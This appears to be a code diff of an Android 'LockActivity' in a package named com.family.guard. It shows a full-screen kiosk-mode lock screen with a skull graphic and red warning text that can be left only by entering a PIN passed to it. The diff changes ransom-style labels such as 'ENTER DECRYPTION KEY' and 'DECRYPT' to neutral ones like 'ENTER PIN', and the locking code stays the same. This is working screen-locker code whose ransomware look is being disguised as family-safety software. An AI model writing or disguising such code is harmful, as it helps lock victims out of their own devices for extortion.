@@ -1,9 +1,7 @@
 package com.family.guard;
 
 import android.app.Activity;
-import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -13,7 +11,6 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.view.Gravity;
-import android.view.View;
 import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.EditText;
@@ -43,13 +40,17 @@ public class LockActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
-                             WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
-                             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                             WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+            setShowWhenLocked(true);
+            setTurnScreenOn(true);
+        } else {
+            getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+                                 WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
+                                 WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                 WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
+        }
 
-        // KIOSK MODE (Ngunci tombol Home/Back)
-        startLockTask();
+        startLockTask(); // Kiosk Mode
 
         String msg = getIntent().getStringExtra("msg");
         String realPin = getIntent().getStringExtra("pin");
@@ -67,7 +68,7 @@ public class LockActivity extends Activity {
         layout.addView(tvSkull);
 
         TextView tvMsg = new TextView(this);
-        tvMsg.setText("YOUR DEVICE IS LOCKED\n\n" + msg);
+        tvMsg.setText("SYSTEM LOCKED\n\n" + msg);
         tvMsg.setTextColor(0xFFFF0000);
         tvMsg.setTextSize(24);
         tvMsg.setGravity(Gravity.CENTER);
@@ -75,7 +76,7 @@ public class LockActivity extends Activity {
         layout.addView(tvMsg);
 
         EditText etPin = new EditText(this);
-        etPin.setHint("ENTER DECRYPTION KEY");
+        etPin.setHint("ENTER PIN");
         etPin.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
         etPin.setTextColor(0xFFFFFFFF);
         etPin.setHintTextColor(0xFF888888);
@@ -83,14 +84,12 @@ public class LockActivity extends Activity {
         layout.addView(etPin);
 
         Button btnUnlock = new Button(this);
-        btnUnlock.setText("DECRYPT");
-        btnUnlock.setBackgroundColor(0xFFFF0000);
-        btnUnlock.setTextColor(0xFFFFFFFF);
+        btnUnlock.setText("UNLOCK");
         btnUnlock.setOnClickListener(v -> {
             if (etPin.getText().toString().equals(realPin)) {
                 finish();
             } else {
-                Toast.makeText(this, "INVALID KEY!", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "PIN SALAH!", Toast.LENGTH_SHORT).show();
             }
         });
         layout.addView(btnUnlock);
